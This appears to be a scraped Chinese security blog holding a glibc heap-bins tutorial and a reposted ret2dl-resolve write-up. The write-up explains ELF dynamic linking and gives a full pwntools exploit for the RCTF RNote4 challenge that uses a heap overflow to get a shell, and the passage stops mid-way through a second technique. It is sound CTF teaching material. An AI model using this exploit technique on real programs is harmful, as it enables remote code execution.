<p>主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</p>
<h3 id="free-函数"><a href="#free-函数" class="headerlink" title="free 函数"></a>free 函数</h3><p>free 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(p,<span class="string">"Hello"</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>程序将 “Hello” 字符串复制到申请到的堆内存空间中。</li>
</ul>
<p>编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中</p>
<p>继续使用 x/32gx 0x602010-0x10 命令查看堆块情况</p>
<p>继续单步 n，执行 free 函数之后，查看堆块情况</p>
<p>这里可以看出原本堆块中存储的内容已经被清空，然后<strong>查看一下 main_arena 的值，发现其中 +0x8 的偏移处</strong>，存储了指向已经 free 了的指针（指向头部，而不是 user data）</p>
<p><strong>小总结</strong></p>
<p>所以调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p>
<h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>顾名思义，就是为了快速重新分配回内存而存在的一个结构。</p>
<blockquote>
<p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p>
</blockquote>
<p>引用一张图：</p>
<ul>
<li>这里的横向排列的就是 main_arene（fast bin）的内存地址</li>
</ul>
<p>假如此时 0x0804a000 处的堆块（实际堆块中的 size 字段要减去 PREV_INUSE 字段值 1，）已经被 free 了，那么他就会被存储<strong>在表示 40 bytes 的 fast bin 的内存地址里</strong></p>
<ul>
<li>注意：<strong>这里把指针和地址区别开。地址存储的是指针，64 位的指针占 8 个字节</strong>。</li>
</ul>
<p><strong>假设我们现在还是以 64 位下的 malloc(10) 为例子。</strong></p>
<p>根据前面那个 free 函数的例子，查看 main_arena 地址中的指针值我们可以看出来，<strong>+0x8 偏移处才是指向 malloc(10) 的堆块的指针</strong>（这个堆块分配后的 user data 实际大小是 16 字节）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> x/2gx &amp;main_arena                           (16 bytes 的链表头)</span><br><span class="line">0x7ffff7dd3760 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000602000</span><br></pre></td></tr></table></figure>

<p>所以这个 16 字节的堆块的指针会被插入属于他的这个链表队列中，也就是如下的情况。</p>
<p>所以这也就印证了在 <strong>main_arena</strong> 中分别表示 <strong>16 Bytes</strong>, <strong>24 Bytes</strong>, <strong>32 Bytes</strong>, … , <strong>80 Bytes</strong> 的内存地址中分别存储着已经 <strong>free</strong> 的而且满足这个大小的 <strong>chunk</strong>的指针。</p>
<p><strong>fast bin 的特性</strong></p>
<p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从<strong>main_arena</strong> 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</p>
<p>如下图所示，此时就是一个单链表结构</p>
<p><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong></p>
<p>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</p>
<p><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。</p>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</p>
<p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</p>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p>
</blockquote>
<ul>
<li>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</li>
<li>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</li>
</ul>
<blockquote>
<p>参考资料：</p>
<p>1、CTF pwn 中最通俗易懂的堆入坑指南[<a href="https://www.anquanke.com/post/id/163971]" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163971]</a></p>
<p>2、浅析Linux堆溢出之fastbin[<a href="https://www.freebuf.com/news/88660.html]" target="_blank" rel="noopener">https://www.freebuf.com/news/88660.html]</a></p>
<p>3、CTF Wiki[]</p>
</blockquote>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/ret2dl-resolve╧Ω╜Γ/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/07/ret2dl-resolve╧Ω╜Γ/" class="post-title-link" itemprop="url">ret2dl-resolve详解</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-07 09:46:50" itemprop="dateCreated datePublished" datetime="2019-10-07T09:46:50-07:00">2019-10-07</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-08 01:03:04" itemprop="dateModified" datetime="2019-10-08T01:03:04-07:00">2019-10-08</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve详解"><a href="#ret2dl-resolve详解" class="headerlink" title="ret2dl-resolve详解"></a>ret2dl-resolve详解</h1><p>转载自看雪论坛，原文：<a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技巧，玩pwn一段时间了，发现自己还有这种知识遗漏。。。所以这篇文章新手向，大神可以绕道了。。。。</p>
<h1 id="0x01-ELF文件格式以及动态链接"><a href="#0x01-ELF文件格式以及动态链接" class="headerlink" title="0x01 ELF文件格式以及动态链接"></a>0x01 ELF文件格式以及动态链接</h1><p>我们知道，无论是windows下还是linux下，程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接，比方说，windows下，叫作IAT表，linux下，叫作GOT表。调用库函数时，会有个类似call  [xxx] 或者 jmp  [xxx]的指令，其中xxx是IAT表或者GOT表的地址。在这里因为是linux的pwn，我们主要讨论GOT表，以及在linux下更为常见的jmp  [xxx].</p>
<h2 id="linux如何调用库函数"><a href="#linux如何调用库函数" class="headerlink" title="linux如何调用库函数"></a>linux如何调用库函数</h2><p>首先一个hello world程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c</span></span><br></pre></td></tr></table></figure>

<p>其中，这个puts是调用的libc这个动态链接库导出的一个函数。编译它，看看puts是怎么被调用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset s        ; <span class="string">"Hello Pwn\n"</span></span><br><span class="line">call    _puts ;这里调用<span class="built_in">puts</span></span><br><span class="line">_puts:</span><br><span class="line">jmp     ds:off_804A00C ; <span class="built_in">puts</span>会call到这里，这里就是“jmp [GOT表地址]”的这样一条指令</span><br></pre></td></tr></table></figure>

<p>跟一下，看看这个off_804A00C在<strong>第一次调用</strong>时是什么东西</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_T4GWFF2PV36ZNX8.png.jpg" alt="img"></p>
<p>可以发现，是0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy  load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword  ptr  [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp  [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定，如果把它也延迟绑定就会出现先有鸡还是先有蛋的问题了。</p>
<h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>section，segment是什么东西不说了，不知道的话呢谷歌百度一下</p>
<h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个hellopwn上它长这样，事实上这个section所有程序都差不多</p>
<p> <img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_UH6SD6XJVZW7T24.png.jpg" alt="img"></p>
<p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，可以<code>readelf -S hellopwn</code>看一下，会发现这三个section的地址跟在上图所示的地址是一样的。</p>
<h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YBW9WNCFG6ARTBN.png.jpg" alt="img"></p>
<p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_NQJC7WN7V477NFU.png.jpg" alt="img"></p>
<p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>

<h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_MBHEB59H58HGWSJ.png.jpg" alt="img"></p>
<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; //指向GOT表的指针</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br><span class="line">  //1和3是这个导入函数的符号在.dynsym中的下标，</span><br><span class="line">  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<h2 id="dl-runtime-resolve做了什么"><a href="#dl-runtime-resolve做了什么" class="headerlink" title="_dl_runtime_resolve做了什么"></a>_dl_runtime_resolve做了什么</h2><p>这个想要深入理解的话呢可以去看<code>glibc/elf/dl-runtime.c</code>的源码，这里我就不贴了，因为有一堆宏，看着让人晕，我就直接说下他做了哪些事情。</p>
<p>首先说第一个参数，[0x804a004]是一个<code>link_map</code>的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YVAWY7X8YES3MCB.png.jpg" alt="img"></p>
<p>0x08049f14是<code>.dynamic</code>的指针，与前面图中一致；而第二个参数，是当前要调用的导入函数在<code>.rel.plt</code>中的偏移（不过64位的话就直接是index下标），比方说这里，puts就是0，<code>__libc_start_main</code>就是<code>1*sizeof(Elf32_Rel)=8</code>。</p>
<h3 id="dl-runtime-resolve会"><a href="#dl-runtime-resolve会" class="headerlink" title="_dl_runtime_resolve会"></a>_dl_runtime_resolve会</h3><ol>
<li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li>
<li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
<li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li>
<li>调用这个函数</li>
</ol>
<p>如果阅读libc源码的话会发现实际顺序可能跟我上面所说的有一点偏差，不过意思都一样，我这样说会比较好理解。</p>
<h1 id="0x02-ret2dl-resolve-利用"><a href="#0x02-ret2dl-resolve-利用" class="headerlink" title="0x02 ret2dl-resolve 利用"></a>0x02 ret2dl-resolve 利用</h1><p>那么，这个怎么去利用呢，有两种利用方式</p>
<h2 id="改写-dynamic的DT-STRTAB"><a href="#改写-dynamic的DT-STRTAB" class="headerlink" title="改写.dynamic的DT_STRTAB"></a>改写.dynamic的DT_STRTAB</h2><p>这个只有在checksec时<code>No RELRO</code>可行，即<code>.dynamic</code>可写。因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个<code>free</code>函数，我们就把原本是<code>free</code>字符串的那个偏移位置设为<code>system</code>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>例题就是RCTF的RNote4，题目是一道堆溢出，<code>NO RELRO</code>而且<code>NO PIE</code>溢出到后面的指针可以实现任意地址写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写<code>.dynamic</code>指向字符串表的指针，使其指向一块可写内存，比如<code>.bss</code>，然后再写这块内存，使得相应偏移出刚好有个<code>system\x00</code>。exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=True</span><br><span class="line">#e=ELF('./libc.so.6')</span><br><span class="line">#context.log_level='debug'</span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process('./RNote4')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line">def add(content):</span><br><span class="line">    assert len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def edit(idx, content):</span><br><span class="line">    assert idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def <span class="keyword">delete</span>(idx):</span><br><span class="line">    assert idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line">#伪造的字符串表，(<span class="number">0x457</span><span class="number">-0x3f8</span>)刚好是<span class="string">"free\x00"</span>字符串的偏移</span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line">#先新建两个notes</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line">#将<span class="number">0x601EB0</span>，即.dynamic的字符串表指针，写成<span class="number">0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line">#在<span class="number">0x6020C8</span>处写入伪造的字符串表</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line">#会第一次调用<span class="built_in">free</span>，所以实际上是system(<span class="string">"/bin/sh"</span>)被调用，如前面所说</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="操纵第二个参数，使其指向我们所构造的Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的Elf32_Rel</h2><p>如果<code>.dynamic</code>不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的<code>_dl_runtime_resolve</code>在第二步时</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p>
<p>然后第三步</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
